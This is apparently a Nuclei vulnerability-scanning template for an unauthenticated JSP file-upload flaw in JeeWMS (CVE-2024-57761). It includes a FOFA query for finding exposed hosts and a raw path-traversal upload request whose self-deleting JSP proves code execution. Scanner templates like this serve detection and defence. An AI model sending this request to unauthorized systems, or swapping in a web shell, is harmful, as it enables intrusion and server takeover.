@@ -1,0 +1,43 @@
+id: JeeWMS-commonController_do-File-upload-CVE-2024-57761
+
+info:
+  name: "JeeWMS commonController.do 文件上传导致远程代码执行漏洞"
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: body="url:userController.do?userOrgSelect&userId=" && "loginController.do?changeDefaultOrg"
+      JeeWMS 系统的 commonController.do 接口在处理文件上传请求时存在安全缺陷，攻击者可通过构造恶意请求绕过文件类型校验机制，在未认证状态下将可执行文件写入服务器。该漏洞可被利用实施远程代码执行攻击，导致服务器系统权限被完全接管，存在严重的安全风险。
+  reference:
+  - https://mp.weixin.qq.com/s/5z8k_Uf9mLHtA9CErcBYmw
+  tags: JeeWMS
+
+variables:
+  username: "{{to_lower(rand_base(6))}}" #从可选字符集（默认为字母和数字）生成给定长度字符串的随机序列
+
+http:
+- raw:
+  - |
+    POST /rest/../commonController.do?parserXml HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryHRhkXyQjTSAk8j8c
+
+    ------WebKitFormBoundaryHRhkXyQjTSAk8j8c
+    Content-Disposition: form-data; name="file"; filename="{{username}}.jsp"
+    Content-Type: image/png
+
+    <% out.println("pboyjnnrfipmplsukdeczudsefxmywe"); new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
+    ------WebKitFormBoundaryHRhkXyQjTSAk8j8c--
+  - |
+    GET /{{username}}.jsp HTTP/1.1
+    Host: {{Hostname}}
+
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - 'pboyjnnrfipmplsukdeczudsefxmywe'
+  - type: status
+    status:
+    - 200
